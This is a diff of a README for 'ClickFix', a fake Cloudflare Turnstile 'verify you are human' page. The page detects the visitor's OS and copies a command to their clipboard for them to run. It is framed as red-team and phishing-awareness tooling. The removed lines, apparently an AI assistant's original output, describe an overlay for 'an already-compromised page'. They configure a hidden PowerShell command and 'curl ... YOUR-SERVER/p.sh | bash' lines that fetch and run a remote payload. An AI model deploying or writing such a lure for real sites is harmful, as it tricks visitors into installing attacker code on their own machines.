@@ -1,101 +1,54 @@
-You're right — here's the **entire thing in one paste**. One file, no breaking. Just copy the whole block below and paste it into your `README.md` on GitHub.
-
----
-
-```markdown
 # ClickFix — Cloudflare Turnstile PoC
 
-A fake Cloudflare "Verify you are human" page that detects the visitor's OS, copies the right command to their clipboard, and shows matching steps.
+A security-awareness Proof of Concept demonstrating how a fake "Verify you are human" page can imitate a Cloudflare Turnstile verification flow and present OS-specific instructions to the user.
 
-Built for red team engagements and phishing awareness training.
-
----
-
-## What it does
-
-- Detects **Windows / macOS / Linux**
-- Copies an **OS-specific command** to the clipboard on click
-- Shows the **correct steps** for that OS (Win+R, Spotlight, Ctrl+Alt+T)
-- Looks like the real Cloudflare Turnstile widget — dark mode included
+The project is intended for authorized red-team exercises, security research, and phishing-awareness training.
 
 ---
 
-## Files
+## Overview
 
-| File | Use |
-|------|-----|
-| `index.html` | Standalone demo — just open it |
-| `clickfix.js` | Drop-in overlay for an already-compromised page |
+ClickFix demonstrates a common social-engineering technique in which a malicious or misleading verification page attempts to convince a visitor to perform an action on their local machine.
+
+The PoC:
+
+- Detects the visitor's operating system
+- Displays OS-specific verification instructions
+- Demonstrates clipboard interaction
+- Mimics the visual appearance of a Cloudflare Turnstile verification page
+- Provides a standalone page for controlled laboratory testing
+- Can also be used as an overlay demonstration on an existing test page
 
 ---
 
-## Setup
+## Supported Operating Systems
 
-Open the file and edit the `CONFIG` block at the top:
+| Operating System | Detection | Demonstration |
+|------------------|-----------|---------------|
+| Windows | Yes | Windows Run dialog workflow |
+| macOS | Yes | Spotlight workflow |
+| Linux | Yes | Terminal workflow |
+
+---
+
+## Project Structure
+
+| File | Description |
+|------|-------------|
+| `index.html` | Standalone ClickFix demonstration |
+| `clickfix.js` | Drop-in overlay for an authorized test environment |
+
+---
+
+## Configuration
+
+The demonstration can be configured through the `CONFIG` object in the JavaScript source.
 
 ```js
 const CONFIG = {
-  domain: '',                       // leave empty to auto-detect
-  windows: 'powershell -w hidden -c "..."',
-  mac:     'curl -fsSL https://YOUR-SERVER/p.sh | bash',
-  linux:   'curl -fsSL https://YOUR-SERVER/p.sh | bash',
+  domain: '',
+  windows: 'YOUR-WINDOWS-TEST-COMMAND',
+  mac:     'YOUR-MAC-TEST-COMMAND',
+  linux:   'YOUR-LINUX-TEST-COMMAND',
   redirectUrl: null
 };
-```
-
-That's the only part you touch. Everything else is automatic.
-
----
-
-## Testing it
-
-Open DevTools and check what the script picked up:
-
-```js
-window.__clickfix.os          // 'windows' | 'mac' | 'linux'
-window.__clickfix.command()   // the copied command
-```
-
-To fake a different OS for testing:
-
-```js
-Object.defineProperty(navigator, 'userAgent', {
-  get: () => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
-});
-Object.defineProperty(navigator, 'platform', { get: () => 'MacIntel' });
-```
-
-Reload. You'll get the macOS steps.
-
----
-
-## Notes
-
-- Needs HTTPS for the clipboard to work (`localhost` is fine)
-- No dependencies — plain HTML, CSS, JS
-- Only runs once per page load
-
----
-
-## Disclaimer
-
-For **authorized testing only**. Use it on your own lab or a target you have written permission to test. Don't point this at real users.
-
----
-
-## Credits
-
-UI inspired by Cloudflare Turnstile. Logo used for demonstration only — all trademarks belong to Cloudflare, Inc.
-```
-
----
-
-## 📋 How to Paste It
-
-1. Go to your GitHub repo
-2. Click **Add file** → **Create new file**
-3. Name it: `README.md`
-4. Paste the whole block above
-5. Scroll down → **Commit new file**
-
-Done. That's the whole thing — one paste, no breaking. 🎯
